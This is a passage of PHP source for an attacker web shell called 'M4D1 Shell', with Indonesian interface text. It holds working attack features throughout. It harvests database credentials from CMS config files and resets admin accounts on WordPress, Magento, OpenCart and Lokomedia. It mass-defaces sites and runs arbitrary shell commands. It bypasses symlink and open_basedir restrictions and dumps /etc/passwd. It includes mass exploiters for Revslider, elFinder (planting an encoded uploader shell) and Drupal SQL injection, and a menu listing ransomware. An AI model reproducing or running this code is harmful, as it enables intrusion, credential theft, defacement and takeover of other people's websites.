							$update = mysql_query("UPDATE $prefix SET user_login='$user_baru',user_pass='$pass_baru' WHERE id='$id'");
							print "Config => " . $file_conf . "<br>";
							print "CMS => Wordpress<br>";
							print $url_target;
							if (!$update or !$conn or !$db) {
								print "Status => " . color(1, 1, mysql_error()) . "<br><br>";
							} else {
								print "Status => " . color(1, 2, "sukses edit user, silakan login dengan user & pass yang baru.") . "<br><br>";
							}
							mysql_close($conn);
						} elseif (preg_match("/Magento|Mage_Core/", $config)) {
							$dbhost = getValue($config, "<host><![CDATA[", "]]></host>");
							$dbuser = getValue($config, "<username><![CDATA[", "]]></username>");
							$dbpass = getValue($config, "<password><![CDATA[", "]]></password>");
							$dbname = getValue($config, "<dbname><![CDATA[", "]]></dbname>");
							$dbprefix = getValue($config, "<table_prefix><![CDATA[", "]]></table_prefix>");
							$prefix = $dbprefix . "admin_user";
							$option = $dbprefix . "core_config_data";
							$conn = mysql_connect($dbhost, $dbuser, $dbpass);
							$db = mysql_select_db($dbname);
							$q = mysql_query("SELECT * FROM $prefix ORDER BY user_id ASC");
							$result = mysql_fetch_array($q);
							$id = $result[user_id];
							$q2 = mysql_query("SELECT * FROM $option WHERE path='web/secure/base_url'");
							$result2 = mysql_fetch_array($q2);
							$target = $result2[value];
							if ($target == '') {
								$url_target = "Login => " . color(1, 1, "Cant't get domain name") . "<br>";
							} else {
								$url_target = "Login => <a href='$target/admin/' target='_blank'><u>$target/admin/</u></a><br>";
							}
							$update = mysql_query("UPDATE $prefix SET username='$user_baru',password='$pass_baru' WHERE user_id='$id'");
							print "Config => " . $file_conf . "<br>";
							print "CMS => Magento<br>";
							print $url_target;
							if (!$update or !$conn or !$db) {
								print "Status => " . color(1, 1, mysql_error()) . "<br><br>";
							} else {
								print "Status => " . color(1, 2, "sukses edit user, silakan login dengan user & pass yang baru.") . "<br><br>";
							}
							mysql_close($conn);
						} elseif (preg_match("/HTTP_SERVER|HTTP_CATALOG|DIR_CONFIG|DIR_SYSTEM/", $config)) {
							$dbhost = getValue($config, "'DB_HOSTNAME', '", "'");
							$dbuser = getValue($config, "'DB_USERNAME', '", "'");
							$dbpass = getValue($config, "'DB_PASSWORD', '", "'");
							$dbname = getValue($config, "'DB_DATABASE', '", "'");
							$dbprefix = getValue($config, "'DB_PREFIX', '", "'");
							$prefix = $dbprefix . "user";
							$conn = mysql_connect($dbhost, $dbuser, $dbpass);
							$db = mysql_select_db($dbname);
							$q = mysql_query("SELECT * FROM $prefix ORDER BY user_id ASC");
							$result = mysql_fetch_array($q);
							$id = $result[user_id];
							$target = getValue($config, "HTTP_SERVER', '", "'");
							if ($target == '') {
								$url_target = "Login => " . color(1, 1, "Cant't get domain name") . "<br>";
							} else {
								$url_target = "Login => <a href='$target' target='_blank'><u>$target</u></a><br>";
							}
							$update = mysql_query("UPDATE $prefix SET username='$user_baru',password='$pass_baru' WHERE user_id='$id'");
							print "Config => " . $file_conf . "<br>";
							print "CMS => OpenCart<br>";
							print $url_target;
							if (!$update or !$conn or !$db) {
								print "Status => " . color(1, 1, mysql_error()) . "<br><br>";
							} else {
								print "Status => " . color(1, 2, "sukses edit user, silakan login dengan user & pass yang baru.") . "<br><br>";
							}
							mysql_close($conn);
						} elseif (preg_match("/panggil fungsi validasi xss dan injection/", $config)) {
							$dbhost = getValue($config, 'server = "', '"');
							$dbuser = getValue($config, 'username = "', '"');
							$dbpass = getValue($config, 'password = "', '"');
							$dbname = getValue($config, 'database = "', '"');
							$prefix = "users";
							$option = "identitas";
							$conn = mysql_connect($dbhost, $dbuser, $dbpass);
							$db = mysql_select_db($dbname);
							$q = mysql_query("SELECT * FROM $option ORDER BY id_identitas ASC");
							$result = mysql_fetch_array($q);
							$target = $result[alamat_website];
							if ($target == '') {
								$target2 = $result[url];
								$url_target = "Login => " . color(1, 1, "Cant't get domain name") . "<br>";
								if ($target2 == '') {
									$url_target2 = "Login => " . color(1, 1, "Cant't get domain name") . "<br>";
								} else {
									$cek_login3 = file_get_contents("$target2/adminweb/");
									$cek_login4 = file_get_contents("$target2/lokomedia/adminweb/");
									if (preg_match("/CMS Lokomedia|Administrator/", $cek_login3)) {
										$url_target2 = "Login => <a href='$target2/adminweb' target='_blank'><u>$target2/adminweb</u></a><br>";
									} elseif (preg_match("/CMS Lokomedia|Lokomedia/", $cek_login4)) {
										$url_target2 = "Login => <a href='$target2/lokomedia/adminweb' target='_blank'><u>$target2/lokomedia/adminweb</u></a><br>";
									} else {
										$url_target2 = "Login => <a href='$target2' target='_blank'><u>$target2</u></a> [ <font color=red>gatau admin login nya dimana :p</font> ]<br>";
									}
								}
							} else {
								$cek_login = file_get_contents("$target/adminweb/");
								$cek_login2 = file_get_contents("$target/lokomedia/adminweb/");
								if (preg_match("/CMS Lokomedia|Administrator/", $cek_login)) {
									$url_target = "Login => <a href='$target/adminweb' target='_blank'><u>$target/adminweb</u></a><br>";
								} elseif (preg_match("/CMS Lokomedia|Lokomedia/", $cek_login2)) {
									$url_target = "Login => <a href='$target/lokomedia/adminweb' target='_blank'><u>$target/lokomedia/adminweb</u></a><br>";
								} else {
									$url_target = "Login => <a href='$target' target='_blank'><u>$target</u></a> [ <font color=red>gatau admin login nya dimana :p</font> ]<br>";
								}
							}
							$update = mysql_query("UPDATE $prefix SET username='$user_baru',password='$pass_baru' WHERE level='admin'");
							print "Config => " . $file_conf . "<br>";
							print "CMS => Lokomedia<br>";
							if (preg_match("/Can't get domain name/", $url_target)) {
								print $url_target2;
							} else {
								print $url_target;
							}
							if (!$update or !$conn or !$db) {
								print "Status => " . color(1, 1, mysql_error()) . "<br><br>";
							} else {
								print "Status => " . color(1, 2, "sukses edit user, silakan login dengan user & pass yang baru.") . "<br><br>";
							}
							mysql_close($conn);
						}
					}
				}
			} else {
				print "<center>
				<h2>Mass User Changer M4D1 Shell</h2>
				<form method='post'>
				<input type='radio' name='config_type' value='dir' checked>DIR Config <input type='radio' name='config_type' value='link'>LINK Config<br><br>

				<input type='text' size='50' name='config_dir' style='width:250px;' height = '10' class='form-control' value='" . path() . "'><br><br>
				Set User & Pass: <br>
				<input type='text' style='width:250px;' height = '10' class='form-control' name='user_baru' value='M4DI~UciH4' placeholder='user_baru'><br>
				<input type='text' style='width:250px;' height = '10' class='form-control' name='pass_baru' value='M4DI~UciH4' placeholder='pass_baru'><br>
				<input class = 'form-control' style='width: 215px; margin: 5px auto;' type='submit' name='hajar' value='Hajar!'>
				</form></center><hr><br>";
			}
		} elseif (isset($_GET[hex('mass_title')])) {
			echo "<hr><br><center><h2>Mass Title Changer M4D1 Shell</h2>
<form method='post'>
Link Config: <br>
<input type='text' class = 'form-control' height='10' name='linkconf' height='10' style='width: 450px;' placeholder='http://website.com/ia_symconf/'><br><br>
<input type='submit' class = 'form-control' height='10' style='width: 450px;' name='gass' value='Hajar!!' class='oke'>
</form></center><hr><br>";
			if ($_POST['gass']) {
				echo "<center>
<form method='post'>
Link Config: <br>
<textarea name='link'>";
				GrabUrl($_POST['linkconf'], 'wordpress');
				echo "</textarea><br>ID: <input class = 'form-control'  type='text' name='id' value='1'><br>TITLE :<input type='text' name='title' value='Hacked By Index_Attacker'><br>POST CONTENT: <input type='text' name='content' value='Hacked By Index_Attacker'><br>POSTNAME: <input type='text' name='postname' value='HackeD By Index_Attacker'><br>
<input type='submit' style='width: 450px;' name='edittitle' value='Hajar!!'>
</form></center>";
			}
			if ($_POST['edittitle']) {
				$title = htmlspecialchars($_POST['title']);
				$id = $_POST['id'];
				$content = $_POST['content'];
				$postname = $_POST['name'];
				function anucurl($sites)
				{
					$ch = curl_init($sites);
					curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
					curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
					curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 6.1; rv:32.0) Gecko/20100101 Firefox/32.0");
					curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 5);
					curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
					curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
					curl_setopt($ch, CURLOPT_COOKIEJAR, 'cookie.txt');
					curl_setopt($ch, CURLOPT_COOKIEFILE, 'cookie.txt');
					curl_setopt($ch, CURLOPT_COOKIESESSION, true);
					$data = curl_exec($ch);
					curl_close($ch);
					return $data;
				}
				$link = explode("\r\n", $_POST['link']);
				foreach ($link as $dir_config) {
					$config = anucurl($dir_config);
					$dbhost = ambilkata($config, "DB_HOST', '", "'");
					$dbuser = ambilkata($config, "DB_USER', '", "'");
					$dbpass = ambilkata($config, "DB_PASSWORD', '", "'");
					$dbname = ambilkata($config, "DB_NAME', '", "'");
					$dbprefix = ambilkata($config, "table_prefix  = '", "'");
					$prefix = $dbprefix . "posts";
					$option = $dbprefix . "options";
					$conn = mysql_connect($dbhost, $dbuser, $dbpass);
					$db = mysql_select_db($dbname);
					$q = mysql_query("SELECT * FROM $prefix ORDER BY ID ASC");
					$result = mysql_fetch_array($q);
					$id = $result[ID];
					$q2 = mysql_query("SELECT * FROM $option ORDER BY option_id ASC");
					$result2 = mysql_fetch_array($q2);
					$target = $result2[option_value];
					$update = mysql_query("UPDATE $prefix SET post_title='$title',post_content='$content',post_name='$postname',post_status='publish',comment_status='open',ping_status='open',post_type='post',comment_count='1' WHERE id='$id'");
					$update .= mysql_query("UPDATE $option SET option_value='$title' WHERE option_name='blogname' OR option_name='blogdescription'");
					echo "<div style='margin: 5px auto;'>";
					if ($target == '') {
						echo "URL: <font color=red>error, gabisa ambil nama domain nya</font> -> ";
					} else {
						echo "URL: <a href='$target/?p=$id' target='_blank'>$target/?p=$id</a> -> ";
					}
					if (!$update or !$conn or !$db) {
						echo "<font color=red>MySQL Error: " . mysql_error() . "</font><br>";
					} else {
						echo "<font color=lime>sukses di ganti.</font><br>";
					}
					echo "</div>";
					mysql_close($conn);
				}
			}
		} elseif (isset($_GET[hex('bypass')])) {
			echo "<hr><br>";
			echo "<center><h2>Bypasser M4D1 Shell</h2></center><br>";
			echo "<form method = 'POST'>
						<div class = 'row clearfix'>
						<div class = 'col-md-3'>
						<a class = 'form-control ajx' href = '?d=" . hex($d) . "&" . hex('bypass-cf') . "' style='width: 250px;' height='10'><center>Bypass CloudFlare</center></a>
						</div>
						<div class = 'col-md-3'>
						<a class = 'form-control ajx' href = '?d=" . hex($d) . "&" . hex('bypass-server') . "' style='width: 250px;' height='10'><center>Bypass Server</center></a>
						</div>
						<div class = 'col-md-3'>
						<a class = 'form-control ajx' href = '?d=" . hex($d) . "&" . hex('bypass-vhost') . "' style='width: 250px;' height='10'><center>Bypass Vhost</center></a>
						</div>
						<div class = 'col-md-3'>
						<a class = 'form-control ajx' href = '?d=" . hex($d) . "&" . hex('bypass-passwd') . "' style='width: 250px;' height='10'><center>Bypass Passwd</center></a>
						</div>
						</div></form>";
			echo "<hr>";
		} elseif (isset($_GET[hex('bypass-cf')])) {
			echo '
				
				<form method="POST"><br><br><center><hr>
				<h2>Bypass CloudFlare M4D1 Shell</h2>
				<div class = "row clearfix">
				<div class= "col-md-4">
				<select class="form-control" name="krz">
					<option>ftp</option>
						<option>direct-conntect</option>
							<option>webmail</option>
								<option>cpanel</option>
				</select>
				</div>
				<div class = "col-md-4">
				<input class="form-control" type="text" name="target" value="url">
				</div>
				<div class = "col-md-4">
				<input class="form-control" type="submit" value="Bypass">
				</div>
				</div>
				</center>
				<hr><br>
				</form>
				

				';

			$target = $_POST['target'];
			# Bypass From FTP
			if ($_POST['krz'] == "ftp") {
				$ftp = gethostbyname("ftp." . "$target");
				echo "<br><p align='center' dir='ltr'><font face='Tahoma' size='2' color='white'>Correct 
				ip is : </font><font face='Tahoma' size='2' color='#F68B1F'>$ftp</font></p>";
			}
			# Bypass From Direct-Connect
			if ($_POST['krz'] == "direct-conntect") {
				$direct = gethostbyname("direct-connect." . "$target");
				echo "<br><p align='center' dir='ltr'><font face='Tahoma' size='2' color='white'>Correct 
				ip is : </font><font face='Tahoma' size='2' color='#F68B1F'>$direct</font></p>";
			}
			# Bypass From Webmail
			if ($_POST['krz'] == "webmail") {
				$web = gethostbyname("webmail." . "$target");
				echo "<br><p align='center' dir='ltr'><font face='Tahoma' size='2' color='white'>Correct 
				ip is : </font><font face='Tahoma' size='2' color='#F68B1F'>$web</font></p>";
			}
			# Bypass From Cpanel
			if ($_POST['krz'] == "cpanel") {
				$cpanel = gethostbyname("cpanel." . "$target");
				echo "<br><p align='center' dir='ltr'><font face='Tahoma' size='2' color='white'>Correct 
				ip is : </font><font face='Tahoma' size='2' color='#F68B1F'>$cpanel</font></p>";
			}
		} elseif (isset($_GET[hex('bypass-server')])) {
			$dir = path();
		?>
			<form action="?dir=<?php echo $dir; ?>&amp;do=bypassserver" method="post">
				<center /><br />
				<hr>
				<h2>Bypass Server M4D1 Shell</h2><br>
				<?php
				print '
<form method="POST" action=""><br><center>
<b><font color=white><b><font color="black">Command </font></font></b>
<div class = "col-md-4">
<input name="baba" type="text" class="form-control" style="width:250px;" size="34">&nbsp;
</div>
<div class = "col-md-4">
<input type="submit" class="form-control" value="Execute!" style="width:350px;">
<br>
</div>
</form>
<form method="POST" action=""><strong><b><font color="black">Menu Bypass</font></strong>
<select name="liz0" size="1" class="form-control" style="width:250px;">
<option value="cat /etc/passwd">/etc/passwd</option>
<option value="netstat -an | grep -i listen">netstat</option>
<option value="cat /var/cpanel/accounting.log">/var/cpanel/accounting.log</option>
<option value="cat /etc/syslog.conf">/etc/syslog.conf</option>
<option value="cat /etc/hosts">/etc/hosts</option>
<option value="cat /etc/named.conf">/etc/named.conf</option>
<option value="cat /etc/httpd/conf/httpd.conf">/etc/httpd/conf/httpd.conf</option>
</select> <br><input type="submit" class="form-control" style="width:350px;" value="Bypass!">
</form>
<hr><br></center>
';
				ini_restore("safe_mode");
				ini_restore("open_basedir");
				$liz0 = shell_exec($_POST[baba]);
				$liz0zim = shell_exec($_POST[liz0]);
				$uid = shell_exec('id');
				$server = shell_exec('uname -a');
				echo "<pre><h4>";

				echo $liz0;
				echo $liz0zim;
				echo "</h4></pre>";
				"</div>";
				?>
			<?php
		} elseif (isset($_GET[hex('bypass-vhost')])) {
			echo "<hr><form method='POST' action=''>";
			echo "<center><br><font size='6'>Bypass Symlink vHost</font><br><br>";
			echo "<center><input type='submit' value='Bypass it' name='Colii' class = 'form-control' style='width:250px;'></center>";
			if (isset($_POST['Colii'])) {
				system('ln -s / M4DI~UciH4.txt');
				$fvckem = 'T3B0aW9ucyBJbmRleGVzIEZvbGxvd1N5bUxpbmtzDQpEaXJlY3RvcnlJbmRleCBzc3Nzc3MuaHRtDQpBZGRUeXBlIHR4dCAucGhwDQpBZGRIYW5kbGVyIHR4dCAucGhw';
				$file = fopen(".htaccess", "w+");
				$write = fwrite($file, base64_decode($fvckem));
				$Bok3p = symlink("/", "M4DI~UciH4.txt");
				$rt = "<br><a href=M4DI~UciH4.txt TARGET='_blank'><font color=#ff0000 size=2 face='Courier New'><b>
	Bypassed Successfully</b></font></a>";
				echo "<br><br><b>Done.. !</b><br><br>Check link given below for / folder symlink <br>$rt</center>";
			}
			echo "</form><hr><br>";
		} elseif (isset($_GET[hex('bypass-passwd')])) {
			echo '<hr><center><h2>Bypass Etc/Passwd </h2><br>
<table style="width:50%">
  <tr>
    <td><form method="post"><input type="submit" class = "form-control" value="System Function" name="syst"></form></td>
    <td><form method="post"><input type="submit" class = "form-control" value="Passthru Function" name="passth"></form></td>
    <td><form method="post"><input type="submit" class = "form-control" value="Exec Function" name="ex"></form></td>	
    <td><form method="post"><input type="submit" class = "form-control" value="Shell_exec Function" name="shex"></form></td>		
    <td><form method="post"><input type="submit" class = "form-control" value="Posix_getpwuid Function" name="melex"></form></td>
</tr></table>
<br><hr>
<h2>Bypass User</h2><table style="width:50%"><br>
<tr>
    <td><form method="post"><input type="submit" class = "form-control" value="Awk Program" name="awkuser"></form></td>
    <td><form method="post"><input type="submit" class = "form-control" value="System Function" name="systuser"></form></td>
    <td><form method="post"><input type="submit" class = "form-control" value="Passthru Function" name="passthuser"></form></td>	
    <td><form method="post"><input type="submit" class = "form-control" value="Exec Function" name="exuser"></form></td>		
    <td><form method="post"><input type="submit" class = "form-control" value="Shell_exec Function" name="shexuser"></form></td>
</tr>
</table><br><hr>';


			if ($_POST['awkuser']) {
				echo "<textarea class='form-control' cols='65' rows='15'>";
				echo shell_exec("awk -F: '{ print $1 }' /etc/passwd | sort");
				echo "</textarea><br>";
			}
			if ($_POST['systuser']) {
				echo "<textarea class='form-control' cols='65' rows='15'>";
				echo system("ls /var/mail");
				echo "</textarea><br>";
			}
			if ($_POST['passthuser']) {
				echo "<textarea class='form-control' cols='65' rows='15'>";
				echo passthru("ls /var/mail");
				echo "</textarea><br>";
			}
			if ($_POST['exuser']) {
				echo "<textarea class='form-control' cols='65' rows='15'>";
				echo exec("ls /var/mail");
				echo "</textarea><br>";
			}
			if ($_POST['shexuser']) {
				echo "<textarea class='form-control' cols='65' rows='15'>";
				echo shell_exec("ls /var/mail");
				echo "</textarea><br>";
			}
			if ($_POST['syst']) {
				echo "<textarea class='form-control' cols='65' rows='15'>";
				echo system("cat /etc/passwd");
				echo "</textarea><br><br><b></b><br>";
			}
			if ($_POST['passth']) {
				echo "<textarea class='form-control' cols='65' rows='15'>";
				echo passthru("cat /etc/passwd");
				echo "</textarea><br><br><b></b><br>";
			}
			if ($_POST['ex']) {
				echo "<textarea class='form-control' cols='65' rows='15'>";
				echo exec("cat /etc/passwd");
				echo "</textarea><br><br><b></b><br>";
			}
			if ($_POST['shex']) {
				echo "<textarea class='form-control' cols='65' rows='15'>";
				echo shell_exec("cat /etc/passwd");
				echo "</textarea><br><br><b></b><br>";
			}
			echo '<center>';
			if ($_POST['melex']) {
				echo "<textarea class='form-control' cols='65' rows='15'>";
				for ($uid = 0; $uid < 60000; $uid++) {
					$ara = posix_getpwuid($uid);
					if (!empty($ara)) {
						while (list($key, $val) = each($ara)) {
							print "$val:";
						}
						print "\n";
					}
				}
				echo "</textarea><br><br>";
			}
		} elseif (isset($_GET[hex('exploiter')])) {
			echo "<hr><br>";
			echo "<center><h2>Exploiter M4D1 Shell</h2></center><br>";
			echo "<form method = 'POST'>
						<div class = 'row clearfix'>
						<div class = 'col-md-3'>
						<a class = 'form-control ajx' href = '?d=" . hex($d) . "&" . hex('csrf') . "' style='width: 250px;' height='10'><center>CSRF Exploiter</center></a>
						</div>
						<div class = 'col-md-3'>
						<a class = 'form-control ajx' href = '?d=" . hex($d) . "&" . hex('revslider') . "' style='width: 250px;' height='10'><center>Revslider Exploiter</center></a>
						</div>
						<div class = 'col-md-3'>
						<a class = 'form-control ajx' href = '?d=" . hex($d) . "&" . hex('elfinder') . "' style='width: 250px;' height='10'><center>Elfinder Exploiter</center></a>
						</div>
						<div class = 'col-md-3'>
						<a class = 'form-control ajx' href = '?d=" . hex($d) . "&" . hex('drupal') . "' style='width: 250px;' height='10'><center>Drupal Exploiter</center></a>
						</div>
						
						</div>
						
						</form>";
			echo "<hr>";
		} elseif (isset($_GET[hex('csrf')])) {

			echo '
<hr><br><center><h2 style="font-size:33px;">CSRF Exploiter M4D1 Shell</h2><br><br>
<font size="3">*Note : Post File, Type : Filedata / dzupload / dzfile / dzfiles / file / ajaxfup / files[] / qqfile / userfile / etc</font>
<br><br>
<form method="POST" style="font-size:25px;" action= "">
URL: <input type="text" name="url" size="50" height="10" placeholder="http://www.target.com/path/upload.php" style="margin: 5px auto; padding-left: 5px; width:450px;" class = "form-control" required autocomplete = "off"><br>
POST File: <input type="text" name="pf" size="50" height="10" placeholder="Lihat diatas ^" style="margin: 5px auto; padding-left: 5px; width:250px;" required class = "form-control" autocomplete = "off"><br>
<input style="width:350px;" type="submit" name="d" value="Lock!" class = "form-control">
</form><hr><br>';
			$url = $_POST["url"];
			$pf = $_POST["pf"];
			$d = $_POST["d"];
			if ($d) {
				echo "
	<h2>Upload Your Files</h2>
	<form method='post' target='_blank' action='$url' enctype='multipart/form-data'><input type='file' name='$pf'><input type='submit' name='g' value='Upload'></form>";
			}
		} elseif (isset($_GET[hex('revslider')])) {

			echo "
     
<center><hr><br>
<h2>Revslider Exploiter M4D1 Shell</h2>
<form method='post'>
<textarea class='form-control' name='site' cols='50' rows='12'>
http://site.com
http://site2.com
http://site3.com</textarea><br>
<input class='form-control' type='submit' style='width: 150px;' name='sikat' value='Gass!'>
</form></center><hr><br>
";
			function findit($mytext, $starttag, $endtag)
			{
				$posLeft = stripos($mytext, $starttag) + strlen($starttag);
				$posRight = stripos($mytext, $endtag, $posLeft + 1);
				return substr($mytext, $posLeft, $posRight - $posLeft);
			}
			error_reporting(0);
			set_time_limit(0);
			$ya = $_POST['sikat'];
			$co = $_POST['site'];
			if ($ya) {
				$e = explode("
", $co);
				foreach ($e as $bda) {
					//echo '<br>'.$bda;
					$linkof = '/wp-admin/admin-ajax.php?action=revslider_show_image&img=../wp-config.php';
					$dn = ($bda) . ($linkof);
					$file = @file_get_contents($dn);
					if (eregi('DB_HOST', $file) and !eregi('FTP_USER', $file)) {
						echo '<center><font face="courier" color=white >----------------------------------------------</font></center>';
						echo "<center><font face='courier' color='lime' >" . $bda . "</font></center>";
						echo "<font face='courier' color=lime >DB name : </font>" . findit($file, "DB_NAME', '", "');") . "<br>";
						echo "<font face='courier' color=lime >DB user : </font>" . findit($file, "DB_USER', '", "');") . "<br>";
						echo "<font face='courier' color=lime >DB pass : </font>" . findit($file, "DB_PASSWORD', '", "');") . "<br>";
						echo "<font face='courier' color=lime >DB host : </font>" . findit($file, "DB_HOST', '", "');") . "<br>";
					} elseif (eregi('DB_HOST', $file) and eregi('FTP_USER', $file)) {
						echo '<center><font face="courier" color=white >----------------------------------------------</font></center>';
						echo "<center><font face='courier' color='lime' >" . $bda . "</font></center>";
						echo "<font face='courier' color=lime >FTP user : </font>" . findit($file, "FTP_USER','", "');") . "<br>";
						echo "<font face='courier' color=lime >FTP pass : </font>" . findit($file, "FTP_PASS','", "');") . "<br>";
						echo "<font face='courier' color=lime >FTP host : </font>" . findit($file, "FTP_HOST','", "');") . "<br>";
					} else {
						echo "<center><font face='courier' color='red' >" . $bda . " ----> not infected </font></center>";
					}
					echo '<center><font face="courier" color=white >----------------------------------------------</font></center>';
				}
			}
		} elseif (isset($_GET[hex('elfinder')])) {

			echo "<hr><br>";
			echo "<center>";
			echo '<h2>ElFinder Mass Exploiter</h2>';
			echo '<form method="post">
Target: <br>
<textarea class = "form-control" name="target" placeholder="http://www.target.com/elFinder/php/connector.php" style="width: 600px; height: 250px; margin: 5px auto; resize:
none;"></textarea><br>
<input class = "form-control" type="submit" name="x" style="width: 150px; height: 35px; margin: 5px;" value="SIKAT!">
</form></center><hr><br>';
			function ngirim($url, $isi)
			{
				$ch = curl_init("$url");
				curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
				curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
				curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 6.1; rv:32.0) Gecko/20100101 Firefox/32.0");
				curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
				curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
				curl_setopt($ch, CURLOPT_POST, 1);
				curl_setopt($ch, CURLOPT_POSTFIELDS, $isi);
				curl_setopt($ch, CURLOPT_COOKIEJAR, 'coker_log');
				curl_setopt($ch, CURLOPT_COOKIEFILE, 'coker_log');
				$data3 = curl_exec($ch);
				return $data3;
			}
			$target = explode("
", $_POST['target']);
			if ($_POST['x']) {
				foreach ($target as $korban) {
					$nama_doang = "M4DI~UciH4.php";
					$isi_nama_doang = "PD9waHAgCmlmKCRfUE9TVCl7CmlmKEBjb3B5KCRfRklMRVNbImYiXVsidG1wX25hbWUiXSwkX0ZJTEVTWyJmIl1bIm5hbWUiXSkpewplY2hvIjxiPmJlcmhhc2lsPC9iPi0tPiIuJF9GSUxFU1siZiJdWyJuYW1
lIl07Cn1lbHNlewplY2hvIjxiPmdhZ2FsIjsKfQp9CmVsc2V7CgllY2hvICI8Zm9ybSBtZXRob2Q9cG9zdCBlbmN0eXBlPW11bHRpcGFydC9mb3JtLWRhdGE+PGlucHV0IHR5cGU9ZmlsZSBuYW1lPWY+PGlucHV
0IG5hbWU9diB0eXBlPXN1Ym1pdCBpZD12IHZhbHVlPXVwPjxicj4iOwp9Cgo/Pg==";
					$decode_isi = base64_decode($isi_nama_doang);
					$encode = base64_encode($nama_doang);
					$fp = fopen($nama_doang, "w");
					fputs($fp, $decode_isi);
					echo "[!] <a href='$korban' target='_blank'>$korban</a> <br>";
					echo "# Upload[1] ......<br>";
					$url_mkfile = "$korban?cmd=mkfile&name=$nama_doang&target=l1_Lw";
					$b = file_get_contents("$url_mkfile");
					$post1 = array("cmd" => "put", "target" => "l1_$encode", "content" => "$decode_isi",);
					$post2 = array("current" => "8ea8853cb93f2f9781e0bf6e857015ea", "upload[]" => "@$nama_doang",);
					$output_mkfile = ngirim("$korban", $post1);
					if (preg_match("/$nama_doang/", $output_mkfile)) {
						echo "<font color='lime'># Upload Sukses 1... => $nama_doang<br># Coba buka di ../../elfinder/files/...</font><br><br>";
					} else {
						echo "<font color='red'># Upload Gagal Cok! 1 <br># Uploading 2..</font><br>";
						$upload_ah = ngirim("$korban?cmd=upload", $post2);
						if (preg_match("/$nama_doang/", $upload_ah)) {
							echo "<font color='lime'># Upload Sukses 2 => $nama_doang<br># Coba buka di ../../elfinder/files/...</font><br><br>";
						} else {
							echo "<font color='red'># Upload Gagal Lagi Cok! 2</font><br><br>";
						}
					}
				}
			}
		} elseif (isset($_GET[hex('drupal')])) {

			echo "<center><hr><br>";
			echo "
		<h2>Drupal Mass Exploiter</h2><br>
		<form method='post' action=''>
		<textarea rows='10'class='form-control' cols='10' name='url'>
		http://www.site.com
		http://www.site2.com</textarea><br><br>
		<input type='submit' class='form-control' style='width:250px;' name='submit' value='SIKAT!'>
		</form></center><hr><br>
		";
			$drupal = ($_GET["drupal"]);
			if ($drupal == 'drupal') {
				$filename = $_FILES['file']['name'];
				$filetmp = $_FILES['file']['tmp_name'];
				echo "<div class='mybox'><form method='POST' enctype='multipart/form-data'>
   <input type='file'name='file' />
   <input type='submit' value='drupal !' />
</form></div>";
				move_uploaded_file($filetmp, $filename);
			}
			error_reporting(0);
			if (isset($_POST['submit'])) {
				function exploit($url)
				{
					$post_data = "name[0;update users set name %3D 'Exorcism' , pass %3D '" . urlencode('$S$DrV4X74wt6bT3BhJa4X0.XO5bHXl/QBnFkdDkYSHj3cE1Z5clGwu') . "',status %3D'1' where uid %3D '1';#]=FcUk&name[]=Crap&pass=test&form_build_id=&form_id=user_login&op=Log+in";
					$params = array('http' => array('method' => 'POST', 'header' => "Content-Type: application/x-www-form-urlencoded
", 'content' => $post_data));
					$ctx = stream_context_create($params);
					$data = file_get_contents($url . '/user/login/', null, $ctx);
					if ((stristr($data, 'mb_strlen() expects parameter 1 to be string') && $data) || (stristr($data, 'FcUk Crap') && $data)) {
						$fp = fopen("exploited.txt", 'a+');
						fwrite($fp, "Exploitied  User: Exorcism Pass: Exorcism  =====> {$url}/user/login");
						fwrite($fp, "
");
						fwrite($fp, "--------------------------------------------------------------------------------------------------");
						fwrite($fp, "
");
						fclose($fp);
						echo "<font color='lime'><b>Success:<font color='white'>M4DI~UciH4</font> Pass:<font color='white'>M4DI~UciH4</font> =><a href='{$url}/user/login' target=_blank ><font color='green'> {$url}/user/login </font></a></font></b><br>";
					} else {
						echo "<font color='red'><b>Failed => {$url}/user/login</font></b><br>";
					}
				}
				$urls = explode("
", $_POST['url']);
				foreach ($urls as $url) {
					$url = @trim($url);
					echo exploit($url);
				}
			}
		} elseif (isset($_GET[hex('auto_tools')])) {

			echo '<hr><center><h2>Auto Tools M4D1 Shell </h2><br>
<table style="width:90%">
  <tr>
    <td><a class = "form-control ajx" href = ?d=' . hex($d) . '&' . hex("zone-h") . '><center>Zone H</center></a></td>
    <td><a class = "form-control ajx" href = ?d=' . hex($d) . '&' . hex("defacer-id") . '><center>Defacer ID</center></a></td>
    <td><a class = "form-control ajx" href = ?d=' . hex($d) . '&' . hex("jumping") . '><center>Jumping</center></a></td>	
    <td><a class = "form-control ajx" href = ?d=' . hex($d) . '&' . hex("fake-root") . '><center>Fake Root</center></a></td>	
    <td><a class = "form-control ajx" href = ?d=' . hex($d) . '&' . hex("adminer") . '><center>Adminer</center></a></td>
</tr>
<tr>
    <td><a class = "form-control ajx" href = ?d=' . hex($d) . '&' . hex("wp-hijack") . '><center>Wp Auto Hijack</center></a></td>
    <td><a class = "form-control ajx" href = ?d=' . hex($d) . '&' . hex("obfuscator") . '><center>Obfuscator</center></a></td>
    <td><a class = "form-control ajx" href = ?d=' . hex($d) . '&' . hex("zip-menu") . '><center>Zip Menu</center></a></td>
    <td><a class = "form-control ajx" href = ?d=' . hex($d) . '&' . hex("reverse-ip") . '><center>Reverse IP</center></a></td>
    <td><a class = "form-control ajx" href = ?d=' . hex($d) . '&' . hex("rdp") . '><center>K-RDP Shell</center></a></td>
</tr>
<tr>
    <td><a class = "form-control ajx" href = ?d=' . hex($d) . '&' . hex("ransomware") . '><center>Ransomware</center></a></td>
    <td><a class = "form-control ajx" href = ?d=' . hex($d) . '&' . hex("ransomware2") . '><center>Ransomware V2</center></a></td>
    <td><a class = "form-control ajx" href = ?d=' . hex($d) . '&' . hex("whois") . '><center>WhoIs</center></a></td>
    <td><a class = "form-control ajx" href = ?d=' . hex($d) . '&' . hex("phpinfo") . '><center>Php Info</center></a></td>	
